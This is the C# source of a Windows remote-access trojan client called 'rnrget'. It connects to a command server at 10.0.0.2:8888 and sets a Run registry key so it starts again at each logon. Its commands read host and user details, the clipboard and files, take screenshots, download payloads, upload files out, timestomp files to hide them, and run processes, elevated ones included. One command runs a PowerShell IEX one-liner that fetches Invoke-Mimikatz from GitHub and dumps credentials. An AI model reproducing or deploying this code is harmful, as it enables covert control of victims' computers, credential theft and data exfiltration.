using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Collections;
using Microsoft.Win32;
using System.Collections.Generic;
using Microsoft.Win32.TaskScheduler;

namespace rnrclient
{
    public class Program
    {
        static string server = "10.0.0.2";
        static Int32 port = 8888;
        static TcpClient client = new TcpClient(server, port);

        public static void Main()
        {
            runkey();
            connect();
            Console.WriteLine("Press any key to continue: ");
            Console.ReadKey();
        }
        static void send(string s)
        {
            NetworkStream stream = client.GetStream();
            byte[] send = System.Text.Encoding.ASCII.GetBytes(s);
            stream.Write(send, 0, send.Length);
        }
        static void sendfile(string path)
        {
            NetworkStream stream = client.GetStream();
            byte[] file = System.IO.File.ReadAllBytes(path);
            stream.Write(file, 0, file.Length);
        }
        static void connect()
        {
            try
            {
                while (true)
                {
                    string message = "$rnrget> ";
                    Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);
                    NetworkStream stream = client.GetStream();
                    stream.Write(data, 0, data.Length);
                    Console.WriteLine("Sent: {0}", message);
                    data = new Byte[256];
                    String responseData = String.Empty;
                    Int32 bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    Console.WriteLine("Received: {0}", responseData);

                    //parse server response
                    string[] args = responseData.Split();
                    if (args[0] == "hostinfo")
                    {
                        send(hostinfo());
                    }
                    else if (args[0] == "userinfo")
                    {
                        send(userinfo());
                    }
                    else if (args[0] == "help")
                    {
                        send(help());
                    }
                    else if (args[0] == "shares")
                    {
                        send(shares());
                    }
                    else if (args[0] == "ps")
                    {
                        send(ps());
                    }
                    else if (args[0] == "envar")
                    {
                        send(envar());
                    }
                    else if (args[0] == "dld")
                    {
                        dld(args[1], args[2]);
                    }
                    else if (args[0] == "xfil")
                    {
                        xfil(args[1], args[2]);
                    }
                    else if (args[0] == "ts")
                    {
                        ts(args[1]);
                    }
                    else if (args[0] == "enumdir")
                    {
                        send(enumdir(args[1]));
                    }
                    else if (args[0] == "pwd")
                    {
                        send(pwd());
                    }
                    else if (args[0] == "mkdir")
                    {
                        mkdir(args[1]);
                    }
                    else if (args[0] == "mv")
                    {
                        mv(args[1], args[2]);
                    }
                    else if (args[0] == "cp")
                    {
                        cp(args[1], args[2]);
                    }
                    else if (args[0] == "del")
                    {
                        del(args[1]);
                    }
                    else if (args[0] == "run")
                    {
                        run(args[1]);
                    }
                    else if (args[0] == "runadmin")
                    {
                        runadmin(args[1]);
                    }
                    else if (args[0] == "arch")
                    {
                        arch(args[1], args[2]);
                    }
                    else if (args[0] == "screencap")
                    {
                        string path = screencap(args[1]);
                        sendfile(path);
                    }
                    else if (args[0] == "sendfile")
                    {
                        sendfile(args[1]);
                    }
                    else if (args[0] == "persist")
                    {
                        //persist();
                    }
                    else if (args[0] == "mimi")
                    {
                        mimikatz();
                    }
                    else if (args[0] == "cat")
                    {
                        send(cat(args[1]));
                    }
                    else if (args[0] == "clip")
                    {
                        send(clip());
                    }
                    else if (args[0] == "exit")
                    {
                        stream.Close();
                        client.Close();
                        return;
                    }
                    else
                    {
                        send("Command not recognized....\n");
                    }
                }
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: " + e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: " + e);
            }
        }
        static string hostinfo()
        {
            string hostName = Dns.GetHostName();
            string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
            StringBuilder response = new StringBuilder();
            response.Append("IP: " + ip);
            response.Append("\nHostname: " + System.Environment.MachineName);
            response.Append("\nMAC: ");
            string Query2 = "SELECT * FROM win32_networkadapterconfiguration";
            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(Query2);
            var mac = "";
            foreach (ManagementObject nic in searcher2.Get())
            {
                mac += Convert.ToString(nic.Properties["MACAddress"].Value);
                if (mac.Length <= 17 && mac.Length != 0)
                {
                    response.AppendLine(mac);
                }

            }
            response.Append("\nProcessor Count: " + System.Environment.ProcessorCount);
            response.Append("\n64-bit: " + System.Environment.Is64BitOperatingSystem);
            response.Append("\nLogical Drive: " + Environment.GetLogicalDrives());
            string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
            UInt64 Capacity = 0;
            foreach (ManagementObject WniPART in searcher.Get())
            {
                Capacity += Convert.ToUInt64(WniPART.Properties["Capacity"].Value);
            }
            response.Append("\nTotal RAM: " + Capacity);
            response.Append("\n");
            return response.ToString();
        }
        static string userinfo()
        {
            StringBuilder response = new StringBuilder();
            response.Append("Username: " + Environment.UserName);
            response.Append("\nDomain\\Username: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                response.Append("\nAdmin: " + admin);
            }
            response.Append("\n");
            return response.ToString();
        }
        static string shares()
        {
            StringBuilder response = new StringBuilder();
            var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
            var wql = "select * FROM Win32_Share";
            var searcher = new ManagementObjectSearcher(wmiPath, wql);
            var shares = searcher.Get();
            response.Append("\nShares:");
            foreach (var share in shares)
            {
                response.Append("\n{0}" + share);
            }
            var wql2 = "select * FROM Win32_MappedLogicalDisk";
            var searcher2 = new ManagementObjectSearcher(wmiPath, wql2);
            var netShares = searcher2.Get();
            if (netShares is null)
            {
                response.Append("\nNo Mapped Drives!");
            }
            else
            {
                response.Append("\nMapped Drives:\n");
                foreach (var share2 in netShares)
                {
                    response.Append("\n{0}");
                }
            }
            return response.ToString();
        }
        static string ps()
        {
            StringBuilder allProcesses = new StringBuilder();
            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
            Process[] processList = Process.GetProcesses();
            foreach (Process process in processList)
            {
                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
                allProcesses.Append(processInfo);
            }
            return allProcesses.ToString();
        }
        static string envar()
        {
            StringBuilder response = new StringBuilder();
            var envar = Environment.GetEnvironmentVariables();
            foreach (DictionaryEntry i in envar)
            {
                response.Append(i.Key + ": " + i.Value + "\n");
            }
            return response.ToString();
        }
        static void dld(string path, string uri)
        {
            var wc = new System.Net.WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            Uri u = new Uri(uri);
            wc.DownloadFile(u, path);
        }
        static void xfil(string path, string uri)
        {
            var wc = new System.Net.WebClient();
            Uri u = new Uri(uri);
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            wc.UploadFile(u, path);
        }
        static void ts(string path)
        {
            System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
            System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
            System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
        }
        static string enumdir(string path)
        {
            var files = System.IO.Directory.EnumerateFiles(path);
            var f = "";
            foreach (string file in files)
            {
                f += "\n" + file;
            }
            var directories = System.IO.Directory.EnumerateDirectories(path);
            foreach (string directory in directories)
            {
                f += "\n" + directory;
            }
            var list = f.Split();
            List<string> result = f.Split('\n').ToList();
            result.Sort();
            StringBuilder response = new StringBuilder();
            foreach (var item in result)
            {
                response.Append(item + "\n");
            }
            return response.ToString();
        }
        static string pwd()
        {
            return Environment.CurrentDirectory;
        }
        static void mkdir(string dir)
        {
            System.IO.Directory.CreateDirectory(dir);
        }
        static void mv(string src, string dest)
        {
            System.IO.File.Move(src, dest);
        }
        static void cp(string src, string dest)
        {
            System.IO.File.Copy(src, dest);
        }
        static void del(string path)
        {
            System.IO.File.Delete(path);
        }
        static void arch(string src, string dest)
        {
            System.IO.Compression.ZipFile.CreateFromDirectory(src, dest);
        }
        static string cat(string path)
        {
            return System.IO.File.ReadAllText(path);
        }
        static string screencap(string dest)
        {
            Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(screencap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, screencap.Size);
            screencap.Save(dest, ImageFormat.Jpeg);
            return dest;
        }
        static void run(string proc)
        {
            Process.Start(proc);
        }
        private static bool runadmin(string proc)
        {
            var SelfProc = new ProcessStartInfo
            {
                UseShellExecute = true,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = proc,
                Verb = "runas",
            };
            try
            {
                Process.Start(SelfProc);
                return true;
            }
            catch
            {
                Console.WriteLine("Insufficient privs.....");
                return false;
            }
        }
        static void runkey()
        {
            var split = Environment.CommandLine.Split();
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rnrget", split[0]);
        }
        static void persist(string type)
        {
            var split = Environment.CommandLine.Split();
            var path = split[0];
            if (type == "logonscript")
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript", "rnrget", path);
            }
            else if (type == "startup")
            {
                System.IO.File.Copy(path, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\rnrget.exe");
            }
            else if  (type == "schtask")
            {
                //
            }

        }
        static void mimikatz()
        {
            string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
            ProcessStartInfo psinfo = new ProcessStartInfo("powershell.exe");
            psinfo.WindowStyle = ProcessWindowStyle.Normal;
            psinfo.Arguments = args;
            Process.Start(psinfo);
        }
        static string clip()
        {
            return System.Windows.Forms.Clipboard.GetText();
        }
        static string help()
        {
            StringBuilder response = new StringBuilder();
            response.Append("Command      Description                 Format\n");
            response.Append("-------      -----------                 ------\n");
            response.Append("help         display help menu           rnrget.exe help, rnrget.exe /?, rnrget.exe ?\n");
            response.Append("arch         create zip file from dir    rnrget.exe arch <source path> <destination path>, rnrget.exe arch C:\\Users\\srcdir C:\\Users\\dest.zip\n");
            response.Append("cp           copy files                  rnrget.exe cp <source path> <destination path>, rnrget.exe cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt\n");
            response.Append("del          delete files                rnrget.exe del <target path>, rnrget.exe del C:\\Users\\Admin\\targetfile.txt\n");
            response.Append("dld          download payloads           rnrget.exe dld <download path> <URI>, rnrget.exe dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld\n");
            response.Append("enumdir      enumerate files             rnrget.exe enumdir <target dir>, rnrget.exe enumdir C:\\Users\\Admin\\Desktop\n");
            response.Append("grep         case sensisitive grep       rnrget.exe grep <pattern> <path>, rnrget.exe grep foo bar.txt\n");
            response.Append("hostinfo     get host information        rnrget.exe hostinfo\n");
            response.Append("keylog       log key strokes             rnrget.exe keylog\n");
            response.Append("mimi         invoke-mimikatz             rnrget.exe mimi\n");
            response.Append("mv           move files                  rnrget.exe mv <source> <destination>, rnrget.exe mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file\n");
            response.Append("mkdir        create directory            rnrget.exe mkdir <target dir>, rnrget.exe mkdir C:\\Users\\Admin\\NewDir\n");
            response.Append("persist      pick yo persistence         rnrget.exe persist logonscript or startup or schtask");
            response.Append("ps           get process listing         rnrget.exe ps\n");
            response.Append("pwd          print working directory     rnrget.exe pwd\n");
            response.Append("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt\n");
            response.Append("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe\n");
            response.Append("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe\n");
            response.Append("screencap    take screenshot             rnrget.exe screencap <save path>, rnrget.exe screencap C:\\Users\\REM\\Desktop\\screencap.bmp\n");
            response.Append("shares       enumerate shares            rnrget.exe shares\n");
            response.Append("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin\n");
            response.Append("userinfo     get user information        rnrget.exe userinfo\n");
            response.Append("xfil         exfil files                 rnrget.exe xfil <target path> <URI>, rnrget.exe xfil C:\\Users\\Admin\\xfil.me, https://raw.githubusercontent.com/rnranalysis/xfiol.file\n");
            response.Append("\n");
            return response.ToString();
        }
    }
}
